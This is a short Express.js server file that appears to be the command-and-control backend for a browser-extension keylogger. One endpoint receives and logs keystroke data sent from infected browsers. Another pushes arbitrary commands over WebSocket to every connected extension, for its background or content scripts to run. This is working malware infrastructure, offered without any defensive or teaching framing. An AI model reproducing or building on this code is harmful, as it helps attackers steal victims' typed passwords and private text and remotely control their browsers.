import express from 'express';
import cors from 'cors';
import http from 'http';
import ws_server, {CLIENTS} from "./ws_server.js";


const app = express();

// Middleware to disable cors
app.use(cors())

// Middleware to parse JSON bodies
app.use(express.json());

// POST request handler
app.post('/key-logger', (req, res) => {
    console.log(req.body); // Logs the request body to the console
    res.status(200)
});

app.post('/send-command', (req, res) => {
    if (!req.body.command) {
        res.status(400).send('Bad request')
    }

    const message = {
        data: req.body.command
    }

    if (req.body.type === 'BACKGROUND') {
        message.type = 'BG_COMMAND'
    } else if (req.body.type === 'CONTENT-SCRIPT') {
        message.type = 'CS_COMMAND'
    }

    const jsonMessage = JSON.stringify(message)

    CLIENTS.forEach(client => {
        client.send(jsonMessage)
    })

    res.status(200).send('Command sent')
})

export const http_server = http.createServer(app);
